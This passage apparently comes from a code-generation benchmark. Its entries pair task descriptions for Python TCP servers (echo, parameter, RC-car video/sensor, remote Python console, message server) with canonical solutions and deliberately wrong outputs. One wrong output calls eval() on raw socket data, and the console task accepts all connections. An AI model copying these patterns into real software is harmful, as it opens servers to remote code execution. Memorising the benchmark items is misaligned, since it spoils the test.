    "Canonical_solution": "from collections import deque\nfrom select import select\nfrom socket import socket, AF_INET, SOCK_STREAM\n\nclass Socket:\n    def __init__(self, sock):\n        self._sock = sock\n    \n    def recv(self, maxbytes):\n        return ReadSocket(self._sock, maxbytes)\n    \n    def send(self, data):\n        return WriteSocket(self._sock, data)\n    \n    def accept(self):\n        return AcceptSocket(self._sock)\n    \n    def __getattr__(self, name):\n        return getattr(self._sock, name)\n\nclass ReadSocket:\n    def __init__(self, sock, nbytes):\n        self.sock = sock\n        self.nbytes = nbytes\n    \n    def handle_yield(self, sched, task):\n        sched._read_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        data = self.sock.recv(self.nbytes)\n        sched.add_ready(task, data)\n\nclass WriteSocket:\n    def __init__(self, sock, data):\n        self.sock = sock\n        self.data = data\n    \n    def handle_yield(self, sched, task):\n        sched._write_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        nsent = self.sock.send(self.data)\n        sched.add_ready(task, nsent)\n\nclass AcceptSocket:\n    def __init__(self, sock):\n        self.sock = sock\n    \n    def handle_yield(self, sched, task):\n        sched._read_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        r = self.sock.accept()\n        sched.add_ready(task, r)\n\nclass EchoServer:\n    def __init__(self, addr, sched):\n        self.sched = sched\n        sched.new(self.server_loop(addr))\n    \n    def server_loop(self, addr):\n        s = Socket(socket(AF_INET, SOCK_STREAM))\n        s.bind(addr)\n        s.listen(5)\n        while True:\n            c, a = yield s.accept()\n            print('Got connection from', a)\n            self.sched.new(self.client_handler(Socket(c)))\n    \n    def client_handler(self, client):\n        while True:\n            line = yield from readline(client)\n            if not line:\n                break\n            line = b'GOT:' + line\n            while line:\n                nsent = yield client.send(line)\n                line = line[nsent:]\n        client.close()\n        print('Client closed')",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nfrom typing import Any, Generator\n\nclass Socket:\n    def __init__(self, sock: socket.socket) -> None:\n        self._sock = sock\n\n    def recv(self, maxbytes: int) -> 'ReadSocket':\n        return ReadSocket(self._sock, maxbytes)\n\n    def send(self, data: bytes) -> 'WriteSocket':\n        return WriteSocket(self._sock, data)\n\n    def accept(self) -> 'AcceptSocket':\n        return AcceptSocket(self._sock)\n\n    def __getattr__(self, name: str) -> Any:\n        return getattr(self._sock, name)\n\nclass ReadSocket:\n    def __init__(self, sock: socket.socket, nbytes: int) -> None:\n        self.sock = sock\n        self.nbytes = nbytes\n\n    def handle_yield(self, sched: object, task: object) -> None:\n        sched.register_read(self.sock, task)\n\n    def handle_resume(self, sched: object, task: object) -> None:\n        self.sock.recv(self.nbytes)\n\nclass WriteSocket:\n    def __init__(self, sock: socket.socket, data: bytes) -> None:\n        self.sock = sock\n        self.data = data\n\n    def handle_yield(self, sched: object, task: object) -> None:\n        sched.register_write(self.sock, task)\n\n    def handle_resume(self, sched: object, task: object) -> None:\n        self.sock.sendall(self.data)\n\nclass AcceptSocket:\n    def __init__(self, sock: socket.socket) -> None:\n        self.sock = sock\n\n    def handle_yield(self, sched: object, task: object) -> None:\n        sched.register_accept(self.sock, task)\n\n    def handle_resume(self, sched: object, task: object) -> None:\n        self.sock.accept()\n\nclass EchoServer:\n    def __init__(self, addr: tuple, sched: object) -> None:\n        self.sched = sched\n        self.server_socket = Socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))\n        self.server_socket.bind(addr)\n        self.server_socket.listen()\n\n    def server_loop(self, addr: tuple) -> Generator:\n        while True:\n            client_sock, _ = yield from self.server_socket.accept()\n            client = Socket(client_sock)\n            self.sched.spawn(self.client_handler(client))\n\n    def client_handler(self, client: Socket) -> Generator:\n        while True:\n            data = yield from client.recv(1024)\n            if not data:\n                break\n            yield from client.send(data)\n```"
  },
  {
    "Task_id": 408,
    "Instruction": "Task Description: Implement a parameter server that handles client requests for model parameters, replay submissions, and draining operations using a threaded TCP server.\n\nClass Description: ParameterServer is a TCP-based server that manages model parameters and replay buffers for distributed training. It handles concurrent client connections and provides thread-safe operations for parameter exchange and replay buffer management.\n\nAttributes:\n\nstate: [State] - Dataclass containing server state including buffer directories, capacity, locks, and parameter versions\nbuffer_dir: [str] - Directory path for storing incoming replay buffers\ndrain_dir: [str] - Directory path for draining replay buffers to trainers\ncapacity: [int] - Maximum capacity of the replay buffer\nforce_sequential: [bool] - Flag to enforce sequential parameter updates\ndir_lock: [Lock] - Thread lock for directory operations\nparam_lock: [Lock] - Thread lock for parameter operations\nbuffer_size: [int] - Current size of the replay buffer\nsubmission_id: [int] - Counter for replay submissions\nmortal_param: [Optional[OrderedDict]] - Current mortal model parameters\ndqn_param: [Optional[OrderedDict]] - Current DQN model parameters\nparam_version: [int] - Version counter for parameter updates\nidle_param_version: [int] - Version marker for idle trainers\n\nMethods:\n\n__init__: [Name](buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool) -> [None] - Initializes the parameter server with buffer directories, capacity, and sequential flag\nstart_server: [Name](host: str, port: int) -> [None] - Starts the threaded TCP server on specified host and port\nhandle_get_param: [Name](msg: dict) -> [None] - Handles parameter retrieval requests from clients\nhandle_submit_replay: [Name](msg: dict) -> [None] - Handles replay buffer submissions from clients\nhandle_submit_param: [Name](msg: dict) -> [None] - Handles parameter updates from trainers\nhandle_drain: [Name]() -> [None] - Handles draining operations for transferring replay buffers to trainers",
    "Canonical_solution": "from socketserver import ThreadingTCPServer, BaseRequestHandler\nfrom threading import Lock\nfrom typing import Optional\nfrom collections import OrderedDict\nfrom dataclasses import dataclass\nimport os\nimport shutil\nimport logging\nimport torch\nfrom io import BytesIO\nfrom common import send_msg, recv_msg\n\n@dataclass\nclass State:\n    buffer_dir: str\n    drain_dir: str\n    capacity: int\n    force_sequential: bool\n    dir_lock: Lock\n    param_lock: Lock\n    buffer_size: int\n    submission_id: int\n    mortal_param: Optional[OrderedDict]\n    dqn_param: Optional[OrderedDict]\n    param_version: int\n    idle_param_version: int\n\nclass ParameterServer:\n    def __init__(self, buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool):\n        self.state = State(\n            buffer_dir=os.path.abspath(buffer_dir),\n            drain_dir=os.path.abspath(drain_dir),\n            capacity=capacity,\n            force_sequential=force_sequential,\n            dir_lock=Lock(),\n            param_lock=Lock(),\n            buffer_size=0,\n            submission_id=0,\n            mortal_param=None,\n            dqn_param=None,\n            param_version=0,\n            idle_param_version=0,\n        )\n\n    def start_server(self, host: str, port: int):\n        if os.path.isdir(self.state.buffer_dir):\n            shutil.rmtree(self.state.buffer_dir)\n        if os.path.isdir(self.state.drain_dir):\n            shutil.rmtree(self.state.drain_dir)\n        os.makedirs(self.state.buffer_dir)\n        os.makedirs(self.state.drain_dir)\n\n        class Handler(BaseRequestHandler):\n            def handle(self):\n                msg = recv_msg(self.request)\n                match msg['type']:\n                    case 'get_param':\n                        self.handle_get_param(msg)\n                    case 'submit_replay':\n                        self.handle_submit_replay(msg)\n                    case 'submit_param':\n                        self.handle_submit_param(msg)\n                    case 'drain':\n                        self.handle_drain()\n\n            def handle_get_param(self, msg):\n                with self.state.dir_lock:\n                    overflow = self.state.buffer_size >= self.state.capacity\n                    with self.state.param_lock:\n                        has_param = self.state.mortal_param is not None and self.state.dqn_param is not None\n                if overflow:\n                    send_msg(self.request, {'status': 'samples overflow'})\n                    return\n                if not has_param:\n                    send_msg(self.request, {'status': 'empty param'})\n                    return\n\n                client_param_version = msg['param_version']\n                buf = BytesIO()\n                with self.state.param_lock:\n                    if self.state.force_sequential and self.state.idle_param_version <= client_param_version:\n                        res = {'status': 'trainer is busy'}\n                    else:\n                        res = {\n                            'status': 'ok',\n                            'mortal': self.state.mortal_param,\n                            'dqn': self.state.dqn_param,\n                            'param_version': self.state.param_version,\n                        }\n                    torch.save(res, buf)\n                send_msg(self.request, buf.getbuffer(), packed=True)\n\n            def handle_submit_replay(self, msg):\n                with self.state.dir_lock:\n                    for filename, content in msg['logs'].items():\n                        filepath = os.path.join(self.state.buffer_dir, f'{self.state.submission_id}_{filename}')\n                        with open(filepath, 'wb') as f:\n                            f.write(content)\n                    self.state.buffer_size += len(msg['logs'])\n                    self.state.submission_id += 1\n                    logging.info(f'total buffer size: {self.state.buffer_size}')\n\n            def handle_submit_param(self, msg):\n                with self.state.param_lock:\n                    self.state.mortal_param = msg['mortal']\n                    self.state.dqn_param = msg['dqn']\n                    self.state.param_version += 1\n                    if msg['is_idle']:\n                        self.state.idle_param_version = self.state.param_version\n\n            def handle_drain(self):\n                drained_size = 0\n                with self.state.dir_lock:\n                    buffer_list = os.listdir(self.state.buffer_dir)\n                    raw_count = len(buffer_list)\n                    assert raw_count == self.state.buffer_size\n                    if (not self.state.force_sequential or raw_count >= self.state.capacity) and raw_count > 0:\n                        old_drain_list = os.listdir(self.state.drain_dir)\n                        for filename in old_drain_list:\n                            filepath = os.path.join(self.state.drain_dir, filename)\n                            os.remove(filepath)\n                        for filename in buffer_list:\n                            src = os.path.join(self.state.buffer_dir, filename)\n                            dst = os.path.join(self.state.drain_dir, filename)\n                            shutil.move(src, dst)\n                        drained_size = raw_count\n                        self.state.buffer_size = 0\n                        logging.info(f'files transferred to trainer: {drained_size}')\n                        logging.info(f'total buffer size: {self.state.buffer_size}')\n                send_msg(self.request, {\n                    'count': drained_size,\n                    'drain_dir': self.state.drain_dir,\n                })\n\n        server = ThreadingTCPServer((host, port), Handler)\n        server.allow_reuse_address = True\n        server.daemon_threads = True\n        logging.info(f'listening on {host}:{port}')\n        server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nfrom dataclasses import dataclass\nfrom threading import Lock\nfrom typing import Optional, OrderedDict\nimport os\nimport socket\nimport threading\n\n@dataclass\nclass State:\n    buffer_dirs: list[str]\n    capacity: int\n    dir_lock: Lock\n    param_lock: Lock\n    buffer_size: int\n    submission_id: int\n    mortal_param: Optional[OrderedDict]\n    dqn_param: Optional[OrderedDict]\n    param_version: int\n    idle_param_version: int\n\nclass ParameterServer:\n    def __init__(self, buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool):\n        self.state = State(\n            buffer_dirs=[buffer_dir, drain_dir],\n            capacity=capacity,\n            dir_lock=Lock(),\n            param_lock=Lock(),\n            buffer_size=0,\n            submission_id=0,\n            mortal_param=None,\n            dqn_param=None,\n            param_version=0,\n            idle_param_version=0\n        )\n        self.buffer_dir = buffer_dir\n        self.drain_dir = drain_dir\n        self.capacity = capacity\n        self.force_sequential = force_sequential\n\n    def start_server(self, host: str, port: int):\n        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_socket.bind((host, port))\n        server_socket.listen()\n        print(f\"Server started on {host}:{port}\")\n\n        while True:\n            client_socket, addr = server_socket.accept()\n            print(f\"Connection from {addr}\")\n            client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))\n            client_thread.start()\n\n    def handle_client(self, client_socket: socket.socket):\n        try:\n            while True:\n                msg = client_socket.recv(1024).decode('utf-8')\n                if not msg:\n                    break\n                msg = eval(msg)  # Assuming messages are sent as serialized Python objects\n                msg_type = msg.get('type')\n\n                if msg_type == 'get_param':\n                    self.handle_get_param(msg, client_socket)\n                elif msg_type == 'submit_replay':\n                    self.handle_submit_replay(msg)\n                elif msg_type == 'submit_param':\n                    self.handle_submit_param(msg)\n                elif msg_type == 'drain':\n                    self.handle_drain()\n        finally:\n            client_socket.close()\n\n    def handle_get_param(self, msg: dict, client_socket: socket.socket):\n        with self.state.param_lock:\n            if self.state.mortal_param is not None:\n                client_socket.sendall(str(self.state.mortal_param).encode('utf-8'))\n            else:\n                client_socket.sendall(\"No parameters available\".encode('utf-8'))\n\n    def handle_submit_replay(self, msg: dict):\n        replay_data = msg.get('replay_data')\n        with self.state.dir_lock:\n            if self.state.buffer_size < self.capacity:\n                file_path = os.path.join(self.buffer_dir, f\"replay_{self.state.submission_id}.dat\")\n                with open(file_path, 'w') as f:\n                    f.write(replay_data)\n                self.state.buffer_size += 1\n                self.state.submission_id += 1\n            else:\n                print(\"Buffer is full\")\n\n    def handle_submit_param(self, msg: dict):\n        params = msg.get('params')\n        with self.state.param_lock:\n            if self.force_sequential:\n                if self.state.param_version == msg.get('version'):\n                    self.state.mortal_param = params\n                    self.state.param_version += 1\n            else:\n                self.state.mortal_param = params\n                self.state.param_version += 1\n\n    def handle_drain(self):\n        with self.state.dir_lock:\n            for i in range(self.state.buffer_size):\n                src_file = os.path.join(self.buffer_dir, f\"replay_{i}.dat\")\n                dst_file = os.path.join(self.drain_dir, f\"replay_{i}.dat\")\n                os.rename(src_file, dst_file)\n            self.state.buffer_size = 0\n```"
  },
  {
    "Task_id": 409,
    "Instruction": "Task Description: Create a TCP server that handles both video streaming and sensor data processing concurrently, using separate ports for each type of data. The server should process video frames for object detection and control an RC car based on sensor inputs and detected objects.\n\nClass Description: Server - A class that manages two TCP servers running on different ports, one for video stream processing and another for sensor data handling. It uses multithreading to handle both servers concurrently.\n\nAttributes:\n- host: str - The host address where the server will run.\n- port1: int - The port number for the video stream server.\n- port2: int - The port number for the sensor data server.\n\nMethods:\n- video_stream(host: str, port: int) -> None - Starts a TCP server for video stream processing using the VideoStreamHandler class.\n- sensor_stream(host: str, port: int) -> None - Starts a TCP server for sensor data processing using the SensorDataHandler class.\n- start() -> None - Initializes and starts both servers in separate threads, with the sensor server running as a daemon thread.\n\nClass Description: VideoStreamHandler - A handler class for processing video streams, inheriting from socketserver.StreamRequestHandler. It performs object detection and controls an RC car based on the processed video frames and sensor data.\n\nAttributes:\n- nn: NeuralNetwork - A neural network model for image prediction.\n- obj_detection: ObjectDetection - An object detection utility.\n- rc_car: RCControl - An interface for controlling the RC car.\n- stop_cascade: cv2.CascadeClassifier - A classifier for detecting stop signs.\n- light_cascade: cv2.CascadeClassifier - A classifier for detecting traffic lights.\n- d_to_camera: DistanceToCamera - A utility for calculating distances to detected objects.\n- d_sensor_thresh: int - Threshold distance for sensor-based stopping.\n- d_stop_light_thresh: int - Threshold distance for stop sign and traffic light detection.\n- d_stop_sign: float - Current distance to the nearest stop sign.\n- d_light: float - Current distance to the nearest traffic light.\n- stop_start: int - Timestamp when stopping begins.\n- stop_finish: int - Timestamp when stopping ends.\n- stop_time: float - Duration of the stop.\n- drive_time_after_stop: float - Time driven after a stop.\n\nMethods:\n- __init__(request, client_address, server) -> None - Initializes the handler with necessary models and parameters.\n- handle() -> None - Processes incoming video stream, performs object detection, and controls the RC car based on the detected objects and sensor data.\n\nClass Description: SensorDataHandler - A handler class for processing sensor data, inheriting from socketserver.BaseRequestHandler. It reads and processes sensor data received from the client.\n\nAttributes: None\n\nMethods:\n- handle() -> None - Continuously reads sensor data from the client, updates the global sensor_data variable, and prints the received data.",
    "Canonical_solution": "import cv2\nimport sys\nimport threading\nimport socketserver\nimport numpy as np\n\nclass SensorDataHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        global sensor_data\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            sensor_data = round(float(data), 1)\n            print(sensor_data)\n\nclass VideoStreamHandler(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.nn = NeuralNetwork()\n        self.nn.load_model(\"saved_model/nn_model.xml\")\n        self.obj_detection = ObjectDetection()\n        self.rc_car = RCControl(\"/dev/tty.usbmodem1421\")\n        self.stop_cascade = cv2.CascadeClassifier(\"cascade_xml/stop_sign.xml\")\n        self.light_cascade = cv2.CascadeClassifier(\"cascade_xml/traffic_light.xml\")\n        self.d_to_camera = DistanceToCamera()\n        self.d_sensor_thresh = 30\n        self.d_stop_light_thresh = 25\n        self.d_stop_sign = self.d_stop_light_thresh\n        self.d_light = self.d_stop_light_thresh\n        self.stop_start = 0\n        self.stop_finish = 0\n        self.stop_time = 0\n        self.drive_time_after_stop = 0\n        super().__init__(request, client_address, server)\n\n    def handle(self):\n        global sensor_data\n        stream_bytes = b' '\n        stop_flag = False\n        stop_sign_active = True\n\n        try:\n            while True:\n                stream_bytes += self.rfile.read(1024)\n                first = stream_bytes.find(b'\\xff\\xd8')\n                last = stream_bytes.find(b'\\xff\\xd9')\n                if first != -1 and last != -1:\n                    jpg = stream_bytes[first:last + 2]\n                    stream_bytes = stream_bytes[last + 2:]\n                    gray = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_GRAYSCALE)\n                    image = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_COLOR)\n\n                    height, width = gray.shape\n                    roi = gray[int(height/2):height, :]\n\n                    v_param1 = self.obj_detection.detect(self.stop_cascade, gray, image)\n                    v_param2 = self.obj_detection.detect(self.light_cascade, gray, image)\n\n                    if v_param1 > 0 or v_param2 > 0:\n                        d1 = self.d_to_camera.calculate(v_param1, 5.5, 300, image)\n                        d2 = self.d_to_camera.calculate(v_param2, 5.5, 100, image)\n                        self.d_stop_sign = d1\n                        self.d_light = d2\n\n                    image_array = roi.reshape(1, int(height/2) * width).astype(np.float32)\n                    prediction = self.nn.predict(image_array)\n\n                    if sensor_data and int(sensor_data) < self.d_sensor_thresh:\n                        self.rc_car.stop()\n                        sensor_data = None\n                    elif 0 < self.d_stop_sign < self.d_stop_light_thresh and stop_sign_active:\n                        self.rc_car.stop()\n                        if not stop_flag:\n                            self.stop_start = cv2.getTickCount()\n                            stop_flag = True\n                        self.stop_finish = cv2.getTickCount()\n                        self.stop_time = (self.stop_finish - self.stop_start) / cv2.getTickFrequency()\n                        if self.stop_time > 5:\n                            stop_flag = False\n                            stop_sign_active = False\n                    elif 0 < self.d_light < self.d_stop_light_thresh:\n                        if self.obj_detection.red_light:\n                            self.rc_car.stop()\n                        self.d_light = self.d_stop_light_thresh\n                        self.obj_detection.red_light = False\n                    else:\n                        self.rc_car.steer(prediction)\n                        self.stop_start = cv2.getTickCount()\n                        self.d_stop_sign = self.d_stop_light_thresh\n                        if not stop_sign_active:\n                            self.drive_time_after_stop = (self.stop_start - self.stop_finish) / cv2.getTickFrequency()\n                            if self.drive_time_after_stop > 5:\n                                stop_sign_active = True\n\n                    if cv2.waitKey(1) & 0xFF == ord('q'):\n                        self.rc_car.stop()\n                        break\n        finally:\n            cv2.destroyAllWindows()\n            sys.exit()\n\nclass Server:\n    def __init__(self, host, port1, port2):\n        self.host = host\n        self.port1 = port1\n        self.port2 = port2\n\n    def video_stream(self, host, port):\n        s = socketserver.TCPServer((host, port), VideoStreamHandler)\n        s.serve_forever()\n\n    def sensor_stream(self, host, port):\n        s = socketserver.TCPServer((host, port), SensorDataHandler)\n        s.serve_forever()\n\n    def start(self):\n        sensor_thread = threading.Thread(target=self.sensor_stream, args=(self.host, self.port2))\n        sensor_thread.daemon = True\n        sensor_thread.start()\n        self.video_stream(self.host, self.port1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socketserver\nimport threading\nimport cv2\nimport numpy as np\n\nclass Server:\n    def __init__(self, host, port1, port2):\n        self.host = host\n        self.port1 = port1\n        self.port2 = port2\n\n    def video_stream(self, host, port):\n        with socketserver.TCPServer((host, port), VideoStreamHandler) as server:\n            print(f\"Video Stream Server running on {host}:{port}\")\n            server.serve_forever()\n\n    def sensor_stream(self, host, port):\n        with socketserver.TCPServer((host, port), SensorDataHandler) as server:\n            print(f\"Sensor Data Server running on {host}:{port}\")\n            server.serve_forever()\n\n    def start(self):\n        video_thread = threading.Thread(target=self.video_stream, args=(self.host, self.port1))\n        sensor_thread = threading.Thread(target=self.sensor_stream, args=(self.host, self.port2), daemon=True)\n        video_thread.start()\n        sensor_thread.start()\n        video_thread.join()\n\nclass VideoStreamHandler(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        super().__init__(request, client_address, server)\n        self.nn = NeuralNetwork()\n        self.obj_detection = ObjectDetection()\n        self.rc_car = RCControl()\n        self.stop_cascade = cv2.CascadeClassifier('stop_sign.xml')\n        self.light_cascade = cv2.CascadeClassifier('traffic_light.xml')\n        self.d_to_camera = DistanceToCamera()\n        self.d_sensor_thresh = 50\n        self.d_stop_light_thresh = 100\n        self.d_stop_sign = float('inf')\n        self.d_light = float('inf')\n        self.stop_start = 0\n        self.stop_finish = 0\n        self.stop_time = 0\n        self.drive_time_after_stop = 5\n\n    def handle(self):\n        while True:\n            data = self.request.recv(4096)\n            if not data:\n                break\n            frame = np.frombuffer(data, dtype=np.uint8).reshape(480, 640, 3)\n            processed_frame = self.obj_detection.detect(frame)\n            self.rc_car.control(processed_frame)\n\nclass SensorDataHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            sensor_data = data.decode('utf-8')\n            update_sensor_data(sensor_data)\n            print(f\"Received sensor data: {sensor_data}\")\n\ndef update_sensor_data(data):\n    # Update global sensor data variable\n    pass\n\nclass NeuralNetwork:\n    pass\n\nclass ObjectDetection:\n    def detect(self, frame):\n        # Perform object detection\n        return frame\n\nclass RCControl:\n    def control(self, frame):\n        # Control RC car based on frame\n        pass\n\nclass DistanceToCamera:\n    def calculate_distance(self, object_size):\n        # Calculate distance to object\n        return 0.0\n```"
  },
  {
    "Task_id": 410,
    "Instruction": "Task Description: Create a TCP server that provides a Python console interface for remote clients, allowing them to interact with a Python environment through a socket connection.\n\nClass Description: PythonConsoleServer - A socketserver handler class that manages client connections and provides a Python console interface.\n\nAttributes:\n- env: [Any] - The Python environment/namespace that will be used for the console session.\n- console: [TerminatorConsole] - An instance of TerminatorConsole that handles the actual console interaction.\n- socketio: [io.TextIOWrapper] - A file-like object for socket communication.\n\nMethods:\n- setup() -> None - Initializes the console handler with the environment.\n- handle() -> None - Main method that handles client connections, redirects stdio, and runs the console.\n- verify_request(request, client_address) -> bool - Always returns True to accept all connections (override for security).\n- finish() -> None - Cleanup method (currently does nothing).\n\nClass Description: TerminatorConsole - Handles the actual console interaction and I/O processing.\n\nAttributes:\n- env: [Any] - The Python environment/namespace for the console session.\n- server: [PythonConsoleServer] - Reference to the server instance.\n\nMethods:\n- __init__(env) -> None - Initializes with the given environment.\n- parse_telnet(data) -> str - Processes telnet control characters from input.\n- raw_input(prompt=None) -> str - Reads input from client with optional prompt.\n- write(data) -> None - Writes output to the client.\n- run(server) -> None - Starts the interactive console session with the given server.\n\nFunction Description: spawn - Creates and starts the TCP server in a separate thread.\n\nInput:\n- env: [Any] - The Python environment/namespace to be used in the console sessions.\n\nOutput:\n- tuple: (threading.Thread, socketserver.TCPServer) - Returns the server thread and TCP server instance.",
    "Canonical_solution": "import socket\nimport threading\nimport sys\nif sys.version_info < (3, 0):\n    import SocketServer as socketserver\nelse:\n    import socketserver\nimport re\n\nclass PythonConsoleServer(socketserver.BaseRequestHandler):\n    env = None\n    \n    def setup(self):\n        self.console = TerminatorConsole(PythonConsoleServer.env)\n\n    def handle(self):\n        try:\n            self.socketio = self.request.makefile(mode='rw')\n            sys.stdout = self.socketio\n            sys.stdin = self.socketio\n            sys.stderr = self.socketio\n            self.console.run(self)\n        finally:\n            sys.stdout = sys.__stdout__\n            sys.stdin = sys.__stdin__\n            sys.stderr = sys.__stderr__\n            self.socketio.close()\n\n    def verify_request(self, request, client_address):\n        return True\n\n    def finish(self):\n        pass\n\nclass TerminatorConsole:\n    def __init__(self, env):\n        self.env = env\n\n    def parse_telnet(self, data):\n        data = re.sub('([^\\r])\\r', '\\\\1', data)\n        data = data.replace('\\r\\x00', '')\n        data = data.replace('\\x00', '')\n        return data\n\n    def raw_input(self, prompt=None):\n        if prompt:\n            self.write(prompt)\n\n        buf = ''\n        while True:\n            data = self.server.socketio.read(1)\n            if data == '\\n' or data == '\\006':\n                buf = self.parse_telnet(buf + data)\n                if buf != '':\n                    return buf\n            elif data == '\\004' or data == '':\n                raise EOFError\n            else:\n                buf += data\n\n    def write(self, data):\n        self.server.socketio.write(data)\n        self.server.socketio.flush()\n\n    def run(self, server):\n        self.server = server\n        self.interact()\n\ndef spawn(env):\n    PythonConsoleServer.env = env\n    tcpserver = socketserver.TCPServer(('127.0.0.1', 0), PythonConsoleServer)\n    debugserver = threading.Thread(target=tcpserver.serve_forever, name=\"DebugServer\")\n    debugserver.setDaemon(True)\n    debugserver.start()\n    return (debugserver, tcpserver)",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socketserver\nimport threading\nimport io\nimport sys\nimport code\n\nclass TerminatorConsole:\n    def __init__(self, env):\n        self.env = env\n        self.server = None\n\n    def parse_telnet(self, data):\n        # Placeholder for telnet control character parsing\n        return data\n\n    def raw_input(self, prompt=None):\n        if prompt:\n            self.write(prompt)\n        return self.server.socketio.readline().strip()\n\n    def write(self, data):\n        self.server.socketio.write(data.encode('utf-8'))\n        self.server.socketio.flush()\n\n    def run(self, server):\n        self.server = server\n        try:\n            code.interact(banner=\"\", local=self.env, stdin=self, stdout=self)\n        except Exception as e:\n            self.write(f\"Error: {str(e)}\\n\")\n\nclass PythonConsoleServer(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        super().__init__(request, client_address, server)\n        self.env = {}\n        self.console = TerminatorConsole(self.env)\n        self.socketio = None\n\n    def setup(self):\n        self.socketio = io.TextIOWrapper(self.request.makefile('rw'), encoding='utf-8')\n\n    def handle(self):\n        self.setup()\n        self.console.run(self)\n\n    def verify_request(self, request, client_address):\n        return True\n\n    def finish(self):\n        pass\n\ndef spawn(env):\n    HOST, PORT = \"localhost\", 9999\n    server = socketserver.ThreadingTCPServer((HOST, PORT), lambda *args, **kwargs: PythonConsoleServer(*args, env=env, **kwargs))\n    server_thread = threading.Thread(target=server.serve_forever)\n    server_thread.start()\n    return server_thread, server\n```"
  },
  {
    "Task_id": 411,
    "Instruction": "Task Description: Implement a threaded TCP server in Python that handles client connections and messages, allowing for bidirectional communication while maintaining only one active client connection at a time.\n\nClass Description: MessageServer is a threaded TCP server that inherits from SocketServer.ThreadingTCPServer. It manages client connections, processes incoming messages, and provides methods for sending messages to the connected client. The server runs in a separate daemon thread and maintains state about the current client connection.\n\nAttributes:\n- server_thread: [Thread] - The thread in which the server runs\n- request_verified: [Event] - Event flag indicating whether a client connection has been verified\n- _client_socket: [socket] - The socket object of the currently connected client (None if no client is connected)\n- message_handled: [Event] - Event flag indicating when a message has been processed\n\nMethods:\n- __init__(server_address) -> [None] - Initializes the server with the given address and starts the server thread\n- send(message) -> [None] - Sends a message to the connected client if one exists\n- get_client_socket() -> [socket] - Returns the client socket after waiting for a connection to be verified\n- verify_request(request, client_address) -> [bool] - Verifies and accepts/rejects incoming connections (allows only one active connection)\n\nClass Description: MessageTCPHandler is a request handler class that inherits from SocketServer.BaseRequestHandler. It processes incoming messages from clients and manages the communication loop.\n\nAttributes: (inherits from BaseRequestHandler)\n- request: [socket] - The client connection socket\n- client_address: [tuple] - The client address\n- server: [MessageServer] - Reference to the server instance\n\nMethods:\n- handle() -> [None] - Main handler method that processes incoming messages in a loop, handles disconnections, and manages communication with the client",
    "Canonical_solution": "import threading\nimport logging\nimport sys\nimport socket\nimport unrealcv\nif (sys.version_info > (3, 0)):\n    import socketserver as SocketServer\nelse:\n    import SocketServer\n\nSocketServer.ThreadingMixIn.daemon_threads = True\nSocketServer.TCPServer.allow_reuse_address = True\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.DEBUG)\nlogger.addHandler(logging.StreamHandler(sys.stdout))\n\nclass MessageTCPHandler(SocketServer.BaseRequestHandler):\n    def handle(self):\n        assert self.request != None\n\n        while True:\n            try:\n                logger.debug('Start to handle message')\n                self.server.message_handled.clear()\n                message = unrealcv.SocketMessage.ReceivePayload(self.request)\n\n                if message:\n                    unrealcv.SocketMessage.WrapAndSendPayload(self.request, message)\n                    self.server.message_handled.set()\n                else:\n                    logger.debug('Client release connection')\n                    self.server._client_socket = None\n                    self.server.message_handled.set()\n                    break\n            except Exception as e:\n                if e.errno == 10054:\n                    logger.debug('Remote connection is forcibly closed')\n                    self.server._client_socket = None\n                    self.server.message_handled.set()\n                else:\n                    logger.debug('Unknown exception %s' % str(e))\n                    self.server.message_handled.set()\n\nclass MessageServer(SocketServer.ThreadingTCPServer):\n    def __init__(self, server_address):\n        super(MessageServer, self).__init__(server_address, MessageTCPHandler)\n        \n        def server_thread():\n            cur_thread = threading.current_thread()\n            logger.info('Started in thread %s' % cur_thread.name)\n            self.serve_forever()\n            logger.info(\"The server thread is stopped\")\n\n        self.server_thread = threading.Thread(target=server_thread)\n        self.server_thread.setDaemon(1)\n        self.server_thread.start()\n        \n        self.request_verified = threading.Event()\n        self._client_socket = None\n        self.message_handled = threading.Event()\n\n    def send(self, message):\n        if self._client_socket:\n            unrealcv.SocketMessage.WrapAndSendPayload(self._client_socket, message)\n\n    def get_client_socket(self):\n        self.request_verified.wait()\n        logger.debug('Return client socket')\n        return self._client_socket\n\n    def verify_request(self, request, client_address):\n        logger.debug('Got a connection from %s' % str(client_address))\n        if self._client_socket:\n            logger.debug('Reject, only accept one connection')\n            accepted = False\n        else:\n            logger.debug('Accept, new connection')\n            self._client_socket = request\n            unrealcv.SocketMessage.WrapAndSendPayload(self._client_socket, 'connected to Python Message Server')\n            accepted = True\n\n        self.request_verified.set()\n        return accepted",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
